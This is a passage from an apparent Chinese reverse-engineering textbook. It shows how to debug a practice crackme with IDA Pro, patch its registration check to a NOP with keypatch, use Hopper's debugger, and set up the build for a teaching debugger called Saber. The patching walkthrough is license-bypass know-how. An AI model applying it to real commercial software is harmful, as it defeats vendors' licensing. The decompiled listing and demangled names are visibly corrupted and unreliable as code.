接下来，将使用IDA Pro对cm02程序进行动态调试并破解。cm02运行后需要输入机器码，其中的机器码为macOS系统的序列号。输入序列号后点击验证按钮会对注册码进行检验，如果序列号正确，就会弹出一个注册成功的提示框，反之则会提示注册失败。使用IDA Pro修改该crackme，使其在输入任何注册码的情况下都会提示注册成功。

首先，为IDA Pro安装另一款补丁插件keypatch。keypatch用于在IDA中修改目标文件，它基于keystone引擎实现，keystone是一个开源项目，它将LLVM中的汇编引擎单独提取出来当作一个库来使用，可以将单行或多行的汇编代码直接汇编成机器码。

在macOS上安装keypatch前，需要通过pip安装keystone库：

$ python -m pip install keystone-engine

然后下载keypatch.py $ ^{①} $，并将该文件放到/Applications/IDA\ Pro\ 6.9/idaq.app/Contents/MacOS/plugins文件夹中。其中IDA的版本号可根据实际安装的IDA版本进行修改。

安装完成后启动IDA。如果在IDA的输出窗口中显示ImportError: No module named keystone，则说明keypatch找不到keystone引擎，可以尝试将pip安装的keystone文件夹复制到/Applications/IDA\Pro\6.9/idaq.app/Contents/MacOS/python文件夹中。keystone的安装目录一般跟pip的目录有关，如果找不到可以尝试全盘搜索“keystone-engine”：

$ sudo find / -name "keystone"

接下来用IDA打开cm02，等待IDA分析完，如图7-6所示。

 </div>

由于这个程序十分简单，有逆向经验的朋友应该能直接看出来需要修改的地方，不过此处还是以演示调试功能为主。IDA Pro并不支持本地直接调试x64的应用程序，要调试x64的程序，需要通过远程调试的方式进行调试。IDA Pro远程调试的server端程序都存放在idaq.app/Contents/MacOS/dbgsrv文件夹中，也可以通过直接双击IDA Pro文件夹中的“dbgsrv”快捷方式进入该文件夹。

接下来，启动一个shell并切换到该目录，然后执行 sudo ./mac_serverx64 命令启动调试服务器，启动成功的话会输出以下信息：

IDA Mac OS X 64-bit remote debug server(MT) v1.21. Hex-Rays (c) 2004-2016
Host localhost (127.0.0.1): Listening on port #23946...

表示调试服务器正在监听127.0.0.1地址上的23946端口。如果要修改监听的IP地址和端口号，可以通过-i和-p参数进行修改。

macOS上只有可信赖的程序才有权限调用task_for_pid等对调试器来说十分重要的API，否则只能使用root进行调试。如果不想使用root权限，可以自己通过codesign对调试器程序进行签名并添加到信任。

启动调试服务器后，回到IDA中，在右上角的调试器下拉列表中选择Remote Mac OS X Debugger。选择调试器之后，就可以在反汇编代码上下断点了。要添加一个断点，需要将光标移动到要添加断点的代码行，此处就是cm01程序的开始处，然后点击工具栏上的“Add a breakpoint to current address”按钮，会发现这一行代码变成了红色。

添加完断点之后，点击工具栏的开始调试按钮或使用F9快捷键开始调试。此时IDA Pro会弹出一个提示框，提示执行目标程序可能会有风险，如图7-7所示。

 </div>

本书的测试程序不会对系统有危害，直接选择“Yes”。然后IDA Pro提示没有设置调试服务器的地址，点击“OK”来到远程调试的设置对话框，如图7-8所示。

 </div>

要注意，此处路径都是在远程计算机上的路径，由于调试服务器运行在本机上，因此，远程计算机与本地计算机其实是一样的。填写好IP地址和端口号之后，点击“OK”按钮，就可以开始调试了。

IDA Pro的调试快捷键与OD调试器比较相似，F4为运行到光标处，F7为单步步入，F8为单步步过，F9为运行，也可以通过点击工具栏按钮执行相关命令。断点和运行带函数返回与OD的不同，macOS上的IDA Pro默认没有断点的快捷键（菜单上显示为F2，但实际上不可用，这应该是IDA的Bug），运行到返回的快捷键为ctrl+F7，不过可以通过“Options→Shortcuts”来进行修改。

观察crackme的行为，可以猜测其使用了NSAlert函数显示注册是否成功，所以第一步要先找到程序哪里使用了NSAlert函数。点击菜单“View→Open subviews→Imports”打开导入函数列表窗口，然后用快捷键ctrl+F搜索“NSAlert”，可以找到如下函数：

0000000100006268 _OBJC_CLASS_$_NSAlert
/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit

双击该函数，跳转到该函数的反汇编处，使用快捷键ctrl+X，查找什么地方使用了该函数，如图7-9所示。

 </div>

可以看到，NSAlert的地址被存储在一个8字节的变量中，相信对Windows上的程序导入表有过研究的读者对此不会陌生，这就是导入表中常用的FF 15型的call，通过一个变量保存函数的地址，然后间接地调用该函数。这么做主要是为了方便链接器填充地址表，此处就不详细讨论了。

双击该地址跳转到这个8字节的变量位置，再次按ctrl+X，查找什么地方使用了这个变量，可以看到有两个地方调用了这个函数（根据编译cm02的编译器的不同可能会有细微的差距）：

Up r __TTSf4gs_gs_d__TFC4cm0214ViewController10showDialogfT4infoSS4textSS_T_+25 mov rdi,
cs:classRef_NSAlert
Up r __TTSf4d_n__TFC4cm0214ViewController17onCheckBtnClickedfPs9AnyObject_T_+14B mov rdi,
cs:classRef_NSAlert

此处两个函数名是经过名称改编后的函数名，使用前面介绍过的`swift-demand`命令可将其还原为原始函数名：

xcrun swift-demangle ___TTSf4gs_gs_d___TFC4cm0214ViewController10showDialogfT4infoSS4textSS_T___TTSf4gs_gs_d___TFC4cm0214ViewController10showDialogfT4infoSS4textSS_T___ ---> function signature specialization <Arg[0] = Owned To Guaranteed and Exploded, Arg[1] = Owned To Guaranteed and Exploded, Arg[2] = Dead> of cm02.ViewController.showDialog (info : Swift.String, text : Swift.String) -> ()

xcrun swift-demangle ___TTSf4d_n___TFC4cm0214ViewController17onCheckBtnClickedfPs9AnyObject_T___TTSf4d_n___TFC4cm0214ViewController17onCheckBtnClickedfPs9AnyObject_T___----> function signature specialization <Arg[0] = Dead> of cm02.ViewController.onCheckBtnClicked (Swift.AnyObject) -> ()

这里不太容易观察出具体哪一个调用会是关键点，但第二个函数是ViewController.

onCheckBtnClicked，应该是对应的注册按钮点击事件。将这两个地方都下好断点，通过调试来看具体哪个函数是我们要找的。双击第一条记录，来到对应的反汇编代码处，会发现IDA已经将这里识别为函数，使用快捷键F5进行反编译，并直接在函数开始位置添加一个断点；第二条也做同样的操作。

然后回到cm02，在机器码处随便填写一点东西，点击验证，程序就在IDA中断下来了，如图7-10所示。

32: int64 v30; // =14€6
33: int64 v31; // =tx07
34: int64 v32; // =ax07
35: int64 v33; // rbx07
36: void *v34; // =x87
37: int64 v35; // =x87
38: int64 v37; // [=sp+8h] {rbp-48h}
39: int64 v30; // [=sp+10h] {rbp-40h}
40: char *v39; // [=sp+18h] [rbp-38h]
41: void *v40; // [=sp+20h] [rbp-30h]
42:
43: = nva1f_unknownLoadLoadStrong(... + OJJC_IVAR_EC4c=02IAVionController_KeyCode);
44: v2 = (void *)v1;
45: if (iv);
46: BUG();
47: objc_retain(v1);
48: v40 = v2;
49: v3 = (cha.*)objc_msgSend(v2, (conut_cha.*)selRef_stringValue);
50: v4 = objc_retainAutoreleasedReturnValue(v);
51: v39 = (cha.*)_TZFE10FoundationSS36_unconditionallyBridgeFromObjectiveCfGSgCSo8NSString_SS(v4);
52: v38 = v5;
53: v37 = v6;
54: v7 = swift_unknownWeakLoadStrong(OBJC_IVAR_TtC4cm0214ViewController_machineCode + a1);
55: v8 = (void *)v7;
56: if (iv7)
57: BUG();
58: objc_retain(v7);
59: v9 = (char *)objc_msgSend(v8, (conut_cha.*)selRef_stringValue);
60: v10 = objc_retainAutoreleasedReturnValue(v9);
61: v11 = TZFE10FoundationSS36_unconditionallyBridgeFromObjectiveCfGSgCSo8NSString_SS(v10);
62: v13 = v12;
63: v15 = v14;
64: v16 = *(QWORD *)TFVE10FoundationSS8Encodingau4utf880_v10);
65: v17 = TIFE10FoundationSS4dataFT5usingVES_SS8Encoding20allowLossyConversionSb_GSqVS_4Data_A0_();
66: v18 = TFE10FoundationSS84dataFT5usingVES_SS8Encoding20allowLossyConversionSb_GSqVS_4Data_v16, v17, v11, v13, v15);
67: a1 = unknownRelease(v15);
68: if (iv18)
69: {
70: objc_release(v8);
71: objc_release(v8);
72: BUG();
73: }
74: TFV10Foundation4Data19base64EncodedStringfT7optionsVCSo6NSData21Base64EncodingOptions_SS();
75: v20 = v19;
76: v22 = v21;
77: v24 = v23;
78: rt_swift_release(v18);
79: LOBYTE(v24) = TZFSSoi2eefTSSSS_Sb(v39, v38, v37, v20, v22, v24);
80: objc_release(v40);
81: objc_release(v40);
82: objc_release(v8);
83: objc_release(v8);
84: v25 = objc_msgSend(classRef_NSAlert, selRef_allocWithZone_, OLL);
85: v26 = objc_msgSend(v25, selRef_init);
86: if (v24 & 1)
87: {
88: v27 = TFE10FoundationSS19_bridgeToObjectiveCfT_CSo8NSString(&sunk_100004DA4, -9223372036854775804LL, OLL);
89: objc_msgSend(v26, selRef_setMessageText_, v27);
90: objc_release(v27);
91: v28 = -9223372036854775797LL;
92: v29 = sunk_100004DB0;
93: }
94: else
95: {
96: v30 = TFE10FoundationSS19_bridgeToObjectiveCfT_CSo8NSString(&sunk_100004DB0, -9223372036854775804LL, OLL);
97: objc_msgSend(v26, selRef_setMessageText_, v30);
98: objc_release(v30);
99: v28 = -9223372036854775799LL;
100: v29 = sunk_100004D90;
101: }
102: v31 = TFE10FoundationSS19_bridgeToObjectiveCfT_CSo8NSString(v29, v28, OLL);
103: objc_msgSend(v26, selRef_setInformativeText_, v31);
104: objc_release(v31);
105: objc_msgSend(v26, selRef_setAlertStyle_, ILL);
106: v32 = TFE10FoundationSS19_bridgeToObjectiveCfT_CSo8NSString("OK", 2LL, OLL);
107: v33 = v32;
108: v34 = objc_msgSend(v26, selRef_addButtonWithTitle_, v32);
109: v35 = objc_retainAutoreleasedReturnValue(v34);
110: objc_release(v35);
111: objc_release(v33);
112: objc_msgSend(v26, selRef_runModal);
113: return objc_release(v26);
114: }

 </div>

简单分析一下这段代码，会看到有许多经过名称改编后的函数名，依次把它们转换为正常的函数名，如下所示：

in Foundation): Swift.String._unconditionallyBridgeFromObjectiveC (__ObjC.NSSString?) -> Swift.String_TFVE10FoundationSS8Encodingau4utf8SO_----> (extension in
Foundation): Swift.String.Encoding.utf8.unsafe变色
Foundation): Swift.String.Encoding
_TIFE10FoundationSS4dataFT5usingVES_SS8Encoding20allowLossyConversionSb_GSqVS_4Data_AO_---->
(extension in Foundation): Swift.String.(data (using: (extension in Foundation): Swift.String.Encoding,
allowLossyConversion: Swift.Bool) -> Foundation.Data?).(default argument 1)
_TFE10FoundationSS4dataFT5usingVES_SS8Encoding20allowLossyConversionSb_GSqVS_4Data_----> (extension
in Foundation): Swift.String.data (using: (extension in Foundation): Swift.String.Encoding,
allowLossyConversion: Swift.Bool) -> Foundation.Data?
_TFV10Foundation4Data19base64EncodedStringf7optionsVCSo6NSData21Base64EncodingOptions_SS_---->
Foundation.Data.base64EncodedString (options: _ObjC.NSData.Base64EncodingOptions) -> Swift.String
_TZFSSoi2eefTSSSS_Sb----> static Swift.String.== infix (Swift.String, Swift.String) -> Swift.Bool
_TFE10FoundationSS19_bridgeToObjectiveCfT_CSo8NSSString----> (extension in
Foundation): Swift.String._bridgeToObjectiveC () -> _ObjC.NSSString

把转换后的函数名带入到IDA反编译出的代码中，继续进行分析。

首先，可以很容易看到代码中第49行和第59行向v2、v8两个变量发送了stringValue消息，这个消息就是从文本框中获取文本的消息。因此，可以猜测v2和v8分别是机器码和注册码的文本框。

获取到的字符串是Objective-C的字符串，接下来会调用Swift.String._unconditionally-BridgeFromObjectiveC函数将字符串转换为Swift格式的字符串。

接下来从第64行到第79行就是对获取到的机器码进行加密操作——使用Foundation.Data.base64EncodedString函数将字符串转换为base64编码并与注册码进行比较，比较结果保存在v24中。第84行和第85行实例化了一个NSAlert对象，然后根据比对结果，v24通过发送setMessageText消息设置了NSAlert显示的文字，v27和v30对应的应该就是注册成功和失败的字符串，接下来的代码则是显示该NSAlert。

分析完成，继续调试来验证一下分析是否正确，根据分析，v24就是比对结果，只需要在第86行的if判断上下断点，并把v24变量改为使判断成功的值即可注册成功。注意此处的判断跟一般的C判断有所不同，普通的C代码中不为0的值就是true，而在Objective-C中时判断最低位是否为0，最低位为0，则高位不为0也是false，所以此处if判断是将v24与1进行and操作。

点击菜单Debugger→Debugger Windows→Locals打开监视本地变量的窗口，在第86行添加一个断点。继续运行cm02，走到断点后在Locals窗口中修改v24的值，将最后一位改为1，如图7-11所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="4">Locals (HEXRAYS)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Name</td><td style='text-align: center; word-wrap: break-word;'>Value</td><td style='text-align: center; word-wrap: break-word;'>Type</td><td style='text-align: center; word-wrap: break-word;'>Location</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>v20</td><td style='text-align: center; word-wrap: break-word;'>0x100B19180LL</td><td style='text-align: center; word-wrap: break-word;'>_int64</td><td style='text-align: center; word-wrap: break-word;'>rbx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>v21</td><td style='text-align: center; word-wrap: break-word;'>0x7FFFB6771F08LL</td><td style='text-align: center; word-wrap: break-word;'>_int64</td><td style='text-align: center; word-wrap: break-word;'>rdx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>v22</td><td style='text-align: center; word-wrap: break-word;'>0x100C7F510LL</td><td style='text-align: center; word-wrap: break-word;'>_int64</td><td style='text-align: center; word-wrap: break-word;'>r15</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>v23</td><td style='text-align: center; word-wrap: break-word;'>0x4100000401LL</td><td style='text-align: center; word-wrap: break-word;'>_int64</td><td style='text-align: center; word-wrap: break-word;'>rcx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>v24</td><td style='text-align: center; word-wrap: break-word;'>0x100B17DC1LL</td><td style='text-align: center; word-wrap: break-word;'>_int64</td><td style='text-align: center; word-wrap: break-word;'>ra4</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>v25</td><td style='text-align: center; word-wrap: break-word;'>0x100C7F510LL</td><td style='text-align: center; word-wrap: break-word;'>void *</td><td style='text-align: center; word-wrap: break-word;'>rax</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>v26</td><td style='text-align: center; word-wrap: break-word;'>0x100C7F510LL</td><td style='text-align: center; word-wrap: break-word;'>void *</td><td style='text-align: center; word-wrap: break-word;'>r15</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>v27</td><td style='text-align: center; word-wrap: break-word;'>0x100B17DC0LL</td><td style='text-align: center; word-wrap: break-word;'>_int64</td><td style='text-align: center; word-wrap: break-word;'>r14</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>v28</td><td style='text-align: center; word-wrap: break-word;'>0x100B19180LL</td><td style='text-align: center; word-wrap: break-word;'>signed _int64</td><td style='text-align: center; word-wrap: break-word;'>rbx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>v29</td><td style='text-align: center; word-wrap: break-word;'>0x100C7AB40LL</td><td style='text-align: center; word-wrap: break-word;'>void *</td><td style='text-align: center; word-wrap: break-word;'>rdi</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>v30</td><td style='text-align: center; word-wrap: break-word;'>0x100B17DC0LL</td><td style='text-align: center; word-wrap: break-word;'>_int64</td><td style='text-align: center; word-wrap: break-word;'>r14</td></tr></table>

 </div>

修改完成后继续运行，就会显示注册成功的对话框，如图7-12所示。

 </div>

接下来，需要修改cm02的可执行程序，使其在脱离调试器的情况下也能用任意注册码注册成功。这里的思路也很简单，只需要修改判断v24是否为true的跳转为固定的跳转到注册成功处即可。但是如何通过反编译出的C代码找到对应的汇编代码呢？在这个if上下一个断点，重新运行cm02进行注册，等到走到断点处之后，回到反汇编窗口，就可以看到RIP指向的位置就是“test & jz”组成的经典的判断代码，如图7-13所示。

 </div>

而且可以看到，此时的跳转是回跳转到0x000000010000381处，因此可以判断0x00000001000037D8处才是注册成功的流程。

可以使用之前安装的keypatch插件，将这个jz跳转修改为什么也不做的NOP指令来阻止这个跳转。选中这条跳转指令，使用快捷键ctrl+alt+K打开keypatch的对话框，并将这条指令修改为NOP，并选中下面的“NOPs padding until next instruction boundary”让keypatch自动填充NOP指令来补全jz和NOP的长度差异，如图7-14所示。

 </div>

修改完后，点击菜单Edit→Patch program→Apply patches to input file...打开Apply patches to input file对话框，直接点击“OK”进行打补丁操作。打完补丁后再次运行cm02程序，可以发现，随意填写一个注册码都可以注册成功。

#### 7.3.4 Hopper

Hopper是近几年新出的一款macOS系统上的逆向工具，虽然比IDA少了不少功能，但由于其售价比IDA便宜很多且能满足大多数逆向需求，所以也有不少使用者。

以调试分析crackme为例，载入程序后，点击菜单Debug→Select Debugger，弹出选择调试器窗口。Hopper支持本地调试与远程调试，本地调试功能作为GDB与LLDB的前端来使用，远程调试需要在远程机器上运行Hopper Debugger Server，通过Bonjour协议进行通信。调试器选择界面如图7-15所示。

   </div>

 </div>

选择 “Local Debugger” 进行本地调试，会弹出调试控制界面，然后在界面上点击第一个右三角按钮启用本地调试器，如图7-16所示。

 </div>

控制界面上Control区的一排按钮用来控制调试器操作，与其他调试器的运行、暂停、步入、步过没有区别。下面GPR列表中显示了常规寄存器的值，点击寄存器旁的箭头可以跳转到Memory选项卡查看寄存器指向的内存数据；FPU与MMX显示了浮点寄存器与多媒体指令寄存器的值；

Debugger Console是调试器终端，可以执行后端LLDB或GDB支持的所有命令；Application Output捕获程序的输出。通过几个面板提供的功能，基本可以满足一般的调试需求了。

Hopper支持在反汇编界面上下断点，也可以在Debugger Console输入调试器的断点命令下断。而对于上面IDA Pro使用的调试破解方法，可以输入任意用户名与序列号，弹出错误信息后，按调试控制界面上的暂停按钮，查看界面上的Callstack调用堆栈，如图7-17所示。

 </div>

获取到了按钮调用的注册方法，接下来就是下断点调试了。点击0x1000040ae行，反汇编界面会同步跳转到所在的反汇编代码。在选中的反汇编行的最左边点鼠标左键，或者点击调试控制界面最后一个减号的断点切换，都会下断成功。成功下断点后反汇编界面所在行最左边会显示一个红色的圆点，并且整行汇编代码会红色高亮显示。点击控制界面上第一个运行按钮，让程序恢复执行，再次点击Register按钮断点中断后，中断行会以蓝色显示。接下来就是一步步的调试了，方法与IDA Pro没有区别，此处不再展开。只是在保存这个功能上，Hopper内置了将修改保存到原文件的功能，在这一点上还是比较方便的。

### 7.4 本章小结

本章介绍了macOS上调试软件常用的跟踪与动态调试的方法。软件动态跟踪是以宏观的视角来了解软件的运行内幕，macOS软件跟踪使用最多的是DTrace，掌握DTrace的使用需要了解D脚本语言，而编写合适的跟踪脚本又需要对软件运行机制有全面的了解。在实际的分析过程中，读者需要多动手实践掌握这种高效的方法。

本章同时介绍了macOS上软件动态分析使用的工具，它们都是跨平台的，使用方法也比较简单。在实际的逆向过程中，建议大家多使用LLDB来调试软件，因为它实在是太强大了！

软件动态调试是一门跨平台跨语言的软件诊断技术, 不同平台不同语言的软件调试拥有一套调试思路与方法, 掌握这些工具在一个平台上的使用, 基本也就掌握了它在其他平台上的使用方法。

# 调试器开发

对于逆向工程而言，调试器的使用方法与软件开发的使用方法有着明显的区别：软件开发环节通常使用源代码级别的调试，下断点针对的是代码行与符号地址，而逆向工程下断点的常常是一个内存地址；软件开发单步调试的是代码，逆向工程单步调试的是单条指令；软件开发调试可以动态观察第一个变量，逆向工程观察的通常是内存地址与寄存器。无论是可操作性还是调试体验，软件开发调试都要比在逆向工程中强很多。而本章的调试器开发就是通过实现逆向工程中使用的调试技术，来完整地实现一个逆向工程专用的软件调试器。

### 8.1 概述

调试器是每个逆向工程师都必不可少的工具。作为一名合格的逆向工程师，只知道如何使用调试器是远远不够的，还应该对调试器的工作原理有一定的了解。但是由于与macOS系统调试相关的资料十分稀少，而LLDB和GDB等开源的调试器又过于复杂和庞大，并不适合初学者学习，因此这一章会实现一个简单的调试器Saber，并在实现的过程中详细讲解macOS与调试相关的接口。

由于苹果系统已经不再支持PowerPC处理器，32位的x86应用也已经很少见了，所以本章所讲的技术只适用于x86_64架构下的系统和应用程序，Saber调试器也不支持32位应用。

### 8.2 开发环境搭建

本章的调试器Saber的代码托管于GitHub网站上，仓库地址为https://github.com/avdbg/Saber，该项目以GPL v3协议开源（使用的第三方代码仍为原有协议）。

为了避免项目过于复杂，笔者在开发的时候尽量避免使用其他第三方库。另外，代码中使用了一些C++11的特性，只有界面部分使用了Qt来进行开发。如果大家对C++和Qt不太了解的话，可以先了解一些相关知识。如果在示例代码中用到了C++11的特性，我也会尽量以注释的方式写清楚代码的含义。

接下来将带领大家搭建Saber的开发环境。

#### 8.2.1 安装所需环境

Saber使用C++开发，需要Xcode中的Clang编译器和macOS SDK。Xcode的安装在前面的章节已经介绍过了，此处不再赘述。由于代码中用到了少量的C++11和C++14特性，所以建议读者安装最新版的Xcode，以免遇到难以解决的编译错误，笔者在开发时使用的Xcode版本为8.1。

安装完Xcode之后，需要安装Qt SDK。Saber调试器的界面都是由Qt开发的。Qt项目的官方网站为https://www.qt.io/，可以通过官网上的链接下载macOS平台上的Qt SDK。不过由于Qt官网的服务器位于国外，下载速度不是很理想。

国内有不少镜像站点已经对Qt的仓库做了镜像，因此可以从国内的镜像站点来下载，笔者常用的镜像站点有两个，一个是中科大的镜像站 $ ^{①} $，一个是清华大学的镜像站 $ ^{②} $。在本书写作时，Qt已经发布了5.8版本，目前在Saber项目中使用的是5.7的正式版本，此处使用清华大学提供的镜像，地址为：https://mirrors.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.7/5.7.0/qt-opensource-mac-x64-clang-5.7.0.dmg。

下载完成后得到一个qt-opensource-mac-x64-clang-5.7.0.dmg，如果读者需要用Qt开发Android或iOS应用，也可以下载qt-opensource-mac-x64-android-ios-5.7.0.dmg，其中也包含了桌面版的SDK。双击加载这个dmg并运行其中的qt-opensource-mac-x64-clang-5.7.0.app运行安装程序，首先出现的是欢迎界面，如图8-1所示。

 </div>

This installer provides you with the open source version of Qt 5.7.0.

You have the option to log in using your Qt Account credentials (e.g. Qt Forum login).

If you do not have a Qt Account yet, you can opt to create one in the next step.

Qt Account gives you access to everything Qt Packaging and pricing options

LGPL compliance & obligations

Choosing the right license for your project

 </div>

点击继续，会让你设置一个Qt账户，不过这个账户对大多数人来说并没有什么意义，可以直接点击“Skip”按钮跳过，如图8-2所示。

 </div>

跳过后会来到另一个欢迎界面，再次点击继续，会来到设置安装路径的页面，如图8-3所示。

 </div>

大家可以根据自己的情况选择安装目录，设置完成后点击继续，选择要安装的组件，如图8-4所示。

 </div>

建议大家直接全选安装，如果硬盘空间不足，则可以选择只安装OS X组件，接下来是Qt的许可协议，如图8-5所示。

 </div>

选择 “I have read and agree to the terms contained in the license agreements.” 选项并继续，Qt安装程序会提示你安装已经准备就绪，点击安装按钮开始进行安装，接下来就是漫长的等待。

安装完成之后，可以编译一个简单的窗口程序来检查Qt SDK是否已经成功安装。首先，来到Qt SDK的安装目录，找到安装目录下的“Qt Creator”应用并运行，如图8-6所示，运行后界面如图8-7所示。

 </div>

Q1 Creator

 </div>

点击 “New Project” 按钮创建一个新的应用，模板选择 “Application” 中的 “Qt Widgets Application”，并点击 “Choose” 按钮，如图8-8所示。

 </div>

项目名称命名为 “test_qt”，路径可以根据自己需要进行选择，如图8-9所示。

 </div>

接下来是选择构建套件，因为笔者安装了多个构建套件，所以这里会有较多的选项，选择“Desktop Qt 5.7.0 clang 64bit”并点击继续，如图8-10所示。

 </div>

向导会询问要创建的文件和类的信息，此处只是测试一下Qt SDK是否已经成功安装，直接点击继续，如图8-11所示。

 </div>

接下来的页面会询问是否要添加到版本控制中，并给出创建的文件信息，可直接点击完成结束向导。完成后Qt Creator会显示已经创建好的工程，这个工程默认就是一个空白窗口，点击右下角的绿色箭头编译并运行该工程，如图8-12所示。

 </div>

如果能正常运行App并显示一个空白窗口，则说明Qt SDK安装成功。不过在笔者写作时，Qt SDK跟Xcode 8.x有一个不兼容的bug，在编译时会产生一个错误，如下所示：

Project ERROR: Xcode not set up properly. You may need to confirm the license agreement by running /usr/bin/xcodebuild.

读者在看到本节时可能Qt已经发布新版本并解决了此问题,如果没有解决可以按照如下步骤自行解决。

使用Qt Creator或其他文本编辑工具打开/5.7/clang_64/mkspecs/features/mac/default_pre.prf。

将第15行处的isEmpty($$list($$system("/usr/bin/xcrun -find xcrun 2>/dev/null")))替换为isEmpty($$list($$system("/usr/bin/xcrun -find xcodebuild 2>/dev/null")))。

修改完成后，重新打开test_qt项目，点击编译并运行按钮即可看到程序已经可以正常地编译运行了。

安装完Qt之后，还需要安装CMake和Clion。CMake是一个开源的跨平台自动化构建系统，用来管理和构建Saber工程。CLion则是JetBrains公司开发的一款C/C++的IDE，它支持使用CMake作为工程的管理和构建工具。不过该IDE不是免费的，只有30天的试用期。

如果大家只是想要构建Saber项目或者使用其他IDE来进行开发，也可以不使用CLion。CMake $ ^{①} $和CLion $ ^{②} $的安装过程都十分简单，点击官网页面上对应的下载按钮即可下载到安装用的镜像文件。下载完成后会得到一个dmg格式的磁盘镜像文件，打开后将App拖到右侧的应用文件

夹中即可，分别如图8-13和图8-14所示。

 </div>

 </div>

在初次打开CLion的时候需要进行一些配置，首先是询问是否导入旧版本的CLion的配置，初次安装CLion可以选否，如图8-15所示。

 </div>

接下来是激活CLion，如图8-16所示。想要购买CLion的读者可以直接点击“Buy CLion”按钮进行购买，想要进行试用可以选择“Evaluate free”试用30天。

 </div>

CLion主题界面可以进行设置，如图8-17所示。笔者比较喜欢偏暗的界面，所以在选择UI主题的时候选择了Dacula风格。

 </div>

接下来设置CMake和debugger界面比较重要，如图8-18所示。CMake和LLDB都可以选择使用CLion内置的，但是CLion内置的CMake版本比官方最新发布版本要低，与Xcode结合使用可能会

   </div>

有一些莫名其妙的问题（当然，随着版本的升级，目前最新的版本可能已经解决了兼容性问题），因此建议大家将内置的CMake改为使用自己安装的最新版的CMake。

 </div>

接下来的两个界面是安装和配置插件的，笔者只装了一个Markdown插件，大家可以根据需要自行安装。

Saber的构建环境已经搭建完毕，但是还需要一个工具来获取Saber的源代码。前面已经提到了Saber项目的源代码托管在GitHub上，因此需要使用Git来获取源代码。比较新的Xcode中默认自带了Git，如果读者使用的Xcode没有自带Git工具，可以使用Homebrew进行安装或者到Git官网 $ ^{①} $进行下载，此处不再赘述。

#### 8.2.2 编译 Saber

本节将介绍两种编译Saber的方式，一种不需要使用CLion IDE，方便不想购买CLion或者喜欢使用其他IDE的读者；另一种则是笔者使用的方式，直接使用CLion编写、编译和调试Saber代码。

首先，下载Saber的源代码，在终端中执行如下命令：

cd <要保存源代码的位置>
git clone https://github.com/avdbg/Sabèr.git

如果没有出错，源代码将会保存到当前目录下的Saber文件夹中。

下载好源代码后，打开CMake，如图8-19所示。如果在之前的步骤中安装好了CMake，此时就可以从Launchpad中找到CMake。

 </div>

或者直接使用快捷键command+space打开Spotlight搜索框，输入“`cmake`”并回车，就可以看到CMake的主界面，如图8-20所示。

 </div>

要填写的主要有以下3个部分。

□ “Where is the source code:” 处填写 Saber源代码所在的文件夹，也就是源代码中 CMakeLists.txt文件所在的文件夹。

“Where to build binaries:”处填写生成的工程和编译后的二进制文件保存的位置。笔者一般习惯在源代码的上级目录建立一个新的“<源代码文件夹名>_build”的文件夹，这样既方便识别生成的目录对应的源代码，也不会污染源代码文件夹。

☐ 下面 “Name-Value” 对应的表格则是对工程的配置选项，需要填写好源代码目录和build目录，点击Configure之后才会显示相关的内容。

填写好源代码路径和build路径后，点击Configure按钮，会弹出一个对话框，询问要生成什么类型的工程，如图8-21所示。

 </div>

选择 “Unix Makefile”，会生成一个Makefile文件，然后可以使用make命令进行编译生成。大家如果喜欢使用Xcode或者其他的编译工具，也可以尝试选择其他的生成器。

选择完成器之后，CMake就开始检查编译环境，如果检查失败则会报错并停止。此处可能会遇到无法找到Qt的错误，报错信息如下：

CMake Error at CMakeLists.txt:12 (FIND_PACKAGE):
By not providing "FindQt5Core.cmake" in CMAKE_MODULE_PATH this project has asked CMake to find a package configuration file provided by "Qt5Core", but CMake did not find one.
Could not find a package configuration file provided by "Qt5Core" with any of the following names:

这时可以通过配置来帮助CMake找到它。读者可以仔细观察CMake的界面，如图8-22所示，会发现其中“Qt5Core_DIR”对应的值是“Qt5Core_DIR-NOTFOUND”。

 </div>

将路径改为保存到有“Qt5CoreConfig.cmake”或者“qt5core-config.cmake”文件的路径就可以了。前面已经安装了Qt SDK，在Qt SDK安装目录下的5.7/clang_64/lib/cmake/Qt5Core文件夹下

提供了Qt5CoreConfig.cmake文件，把这个路径填写到Qt5Core_DIR对应的值中即可。注意，不是Qt5CoreConfig.cmake的路径，而是它所在文件夹的路径。

重新点击 “Configure” 按钮，还会遇到Qt5Gui和Qt5Widgets无法找到的错误。使用同样的方法帮助CMake找到，直到Configure不再报错，点击 “Generate” 按钮生成makefile文件或其他的工程文件。

生成makefile后打开一个shell，并切换到build目录，输入make命令开始编译。CMake的编译输出是彩色的，并带有编译的进度，如果有编译错误则会以红色进行提示；如果没有错误，则会在build目录下生成一个Saber可执行文件。以root权限执行该文件就可以看到调试器的界面了，如图8-23所示。

4日10:10:00 周五下午8:22

肉图 30出 城市初春的

 </div>

介绍完了如何使用CMake进行编译，下面再来看一下如何使用CLion进行编译。由于CLion的编译系统也是CMake，所以两者有许多步骤是相同的。

首先，还是通过Launchpad或者Spotlight打开Clion，出现CLion的欢迎界面，如图8-24所示。

 </div>

点击 “Open Project”，在弹出的 “Select Path” 对话框中选择CMakeLists.txt文件所在的文件夹，CLion就开始加载配置了。在加载过程中会遇到与直接使用CMake一样的无法找到Qt5Core的cmake文件的错误，解决方法与直接使用CMake是一样的，不过CLion中的CMake配置在Cache选项卡中，如图8-25所示。

 </div>

双击对应的Value可以进行修改，不过修改完之后一定要点击左侧的软盘图标的按钮进行保存并重新载入工程，否则修改是不起作用的。

配置完成后就可以点击工具栏的绿色箭头进行编译运行了。

### 8.3 系统调试接口

macOS的调试接口相对于其他系统而言显得比较混乱，它有从BSD系统继承而来的ptrace接口，但是却又严重残缺；有UNIX系统的信号机制，但是又同时具有来自Mach内核的异常处理机制。

